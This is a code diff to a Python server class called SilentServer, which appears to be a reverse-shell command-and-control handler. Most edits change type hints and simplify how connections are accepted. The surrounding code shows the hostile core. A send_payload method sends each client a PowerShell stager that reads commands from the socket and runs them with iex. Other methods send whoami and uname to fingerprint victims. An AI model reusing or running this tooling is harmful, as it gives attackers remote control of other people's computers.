@@ -110,7 +110,7 @@ class SilentServer:
 
                 return data == b""
 
-        def print_lost_client(self, client: object) -> None:
+        def print_lost_client(self, client: socket.socket) -> None:
                 if self.in_comm:
                         core.TextAssets.print_lost_client(client, False)
 
@@ -128,8 +128,9 @@ class SilentServer:
         def begin_listen(self) -> None:
                 while True:
                         try:
-                                client, address = self.accept_client()
+                                client, address = self.listener.accept()
                         except:
+                                print("Listener Error! Aborting Listen!")
                                 return None
 
                         client.setblocking(False)
@@ -141,13 +142,7 @@ class SilentServer:
                         )
                         client_check.start()
 
-        def accept_client(self) -> bool:
-                try:
-                        return self.listener.accept()
-                except:
-                        return False
-
-        def begin_accept(self, client: object, address: str) -> None:
+        def begin_accept(self, client: socket.socket, address: str) -> None:
                 client_object           = self.verify_client(client)
 
                 if not client_object:
@@ -169,7 +164,7 @@ class SilentServer:
                 self.clients.append(client_struct)
                 core.TextAssets.print_client(client_struct)
 
-        def verify_client(self, client: object) -> tuple[str, str, str]:
+        def verify_client(self, client: socket.socket) -> tuple[str, str, str]:
                 client_id               = self.get_client_id()
 
                 INITIAL_WAIT            = self.wait_client(client)
@@ -210,7 +205,7 @@ class SilentServer:
 
                 return client_id
 
-        def send_payload(self, client: object, client_id: str) -> bool:
+        def send_payload(self, client: socket.socket, client_id: str) -> bool:
                 client.send(f"$w=[io.streamwriter]::new($t.getstream());$w.write('{client_id}');$w.flush();[io.streamreader]::new($t.getstream()).readline()|iex\n".encode())
                 data                    = self.wait_client(client).decode()
 
@@ -224,7 +219,7 @@ class SilentServer:
 
                 return self.wait_client(client)
 
-        def verify_username(self, client: object) -> tuple[str, str]:
+        def verify_username(self, client: socket.socket) -> tuple[str, str]:
                 client.send("whoami\n".encode())
                 data                    = self.wait_client(client).decode()
 
@@ -253,7 +248,7 @@ class SilentServer:
                 else:
                         return data, None
 
-        def verify_os(self, client: object) -> str:
+        def verify_os(self, client: socket.socket) -> str:
                 client.send("uname\n".encode())
                 data                    = self.wait_client(client).decode()
 
@@ -312,7 +307,7 @@ class SilentServer:
         # Instead of accepting the first data we receive, give a duration of time for the last sent
         # data before accepting the final output.
 
-        def wait_client(self, client: object) -> bytes:
+        def wait_client(self, client: socket.socket) -> bytes:
                 data                    = b""
 
                 data_poll               = DataPoll(
@@ -338,7 +333,7 @@ class SilentServer:
 
                 return data
 
-        def data_poller(self, data_poll: object) -> None:
+        def data_poller(self, data_poll: DataPoll) -> None:
                 times_data_checked      = 0
 
                 while times_data_checked != 20:
